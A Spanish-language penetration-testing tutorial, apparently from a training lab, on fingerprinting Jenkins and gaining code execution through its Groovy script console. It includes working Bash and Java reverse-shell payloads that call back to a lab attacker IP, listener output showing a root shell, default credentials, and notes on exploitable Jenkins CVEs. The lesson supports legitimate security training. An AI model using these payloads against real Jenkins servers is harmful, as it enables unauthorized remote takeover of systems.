---
tags:
  - Enumeración
---

## Enumeración

Jenkins se ejecuta en el puerto Tomcat 8080 de forma predeterminada. También utiliza el puerto 5000 para conectar servidores esclavos. Este puerto se utiliza para comunicarse entre amos y esclavos. Jenkins puede usar una base de datos local, LDAP, base de datos de usuarios de Unix, delegar seguridad en un contenedor de servlets o no usar ninguna autenticación. Los administradores también pueden permitir o no permitir que los usuarios creen cuentas.

![Jenkins Configure la página de Seguridad Global que muestra las opciones de autenticación y seguridad, con 'Jenkins’ propia base de datos de usuarios' y 'Los usuarios registrados pueden hacer cualquier cosa' seleccionados.](https://academy.hackthebox.com/storage/modules/113/jenkins_global_security.png)

La instalación predeterminada generalmente usa la base de datos de Jenkins’ para almacenar credenciales y no permite a los usuarios registrar una cuenta. Podemos tomar las huellas dactilares de Jenkins rápidamente por la página de inicio de sesión reveladora.

![Página de inicio de sesión de Jenkins con campos para nombre de usuario y contraseña, y opción 'Mantenerme conectado'.](https://academy.hackthebox.com/storage/modules/113/jenkins_login.png)

Podemos encontrar una instancia de Jenkins que utiliza credenciales débiles o predeterminadas, como `admin:admin` o no tiene habilitado ningún tipo de autenticación. No es raro encontrar instancias de Jenkins que no requieren autenticación durante una prueba de penetración interna. Aunque es raro, nos hemos encontrado con Jenkins durante las pruebas de penetración externas que pudimos atacar.



## Ataque

### Script Console
Se puede llegar a la consola de scripts en la URL `http://jenkins.inlanefreight.local:8000/script`. 

Esta consola permite a un usuario ejecutar Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, que son un lenguaje compatible con Java orientado a objetos. El lenguaje es similar a Python y Ruby. 

El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga JRE instalado.

Usando esta consola de scripts, es posible ejecutar comandos arbitrarios, funcionando de manera similar a un shell web. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el `id` comando.

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

![Jenkins Script Console con Groovy script para ejecutar el comando 'id', mostrando el resultado como 'uid=0(root) gid=0(root)'.](https://academy.hackthebox.com/storage/modules/113/groovy_web.png)

Hay varias formas en que se puede aprovechar el acceso a la consola de scripts para obtener un shell inverso. Por ejemplo, usando el siguiente comando, o [esto](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Módulo metasploit.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Ejecutar los comandos anteriores da como resultado una conexión de shell inversa.

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844

id

uid=0(root) gid=0(root) groups=0(root)

/bin/bash -i

root@app02:/var/lib/jenkins3#
```


---

#### Windows

Contra un host de Windows, podríamos intentar agregar un usuario y conectarlo al host a través de RDP o WinRM o, para evitar realizar un cambio en el sistema, usar una base de descarga de PowerShell con [Invoque-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Podríamos ejecutar comandos en una instalación de Jenkins basada en Windows usando este fragmento:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

También podríamos usar [esto](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Shell inverso de Java para obtener la ejecución de comandos en un host de Windows, intercambiando `localhost` y el puerto para nuestra dirección IP y puerto de escucha.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

### Vulnerabilidades Varias

Existen varias vulnerabilidades de ejecución remota de código en varias versiones de Jenkins. Un exploit reciente combina dos vulnerabilidades, CVE-2018-1999002 y [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) para lograr la ejecución remota de código preautenticada, omitir la protección de sandbox de seguridad de script durante la compilación de scripts. Los PoC de exploit público existen para explotar una falla en el enrutamiento dinámico de Jenkins para evitar el ACL de Lectura/General y usar Groovy para descargar y ejecutar un archivo JAR malicioso. Esta falla permite a los usuarios con permisos de lectura eludir las protecciones de sandbox y ejecutar código en el servidor maestro de Jenkins. Este exploit funciona contra Jenkins versión 2.137.

Existe otra vulnerabilidad en Jenkins 2.150.2, que permite a usuarios con creación de JOB y privilegios BUILD ejecutar código en el sistema a través de Node.js. Esta vulnerabilidad requiere autenticación, pero si los usuarios anónimos están habilitados, el exploit tendrá éxito porque estos usuarios tienen la creación de JOB y los privilegios BUILD de forma predeterminada.

Como hemos visto, obtener acceso a Jenkins como administrador puede conducir rápidamente a la ejecución remota de código. Si bien existen varios exploits RCE de trabajo para Jenkins, son específicos de la versión. En el momento de escribir este artículo, la versión actual de LTS de Jenkins es 2.303.1, que corrige los dos defectos detallados anteriormente. Al igual que con cualquier aplicación o sistema, es importante endurecer Jenkins tanto como sea posible, ya que la funcionalidad incorporada se puede usar fácilmente para hacerse cargo del servidor subyacente.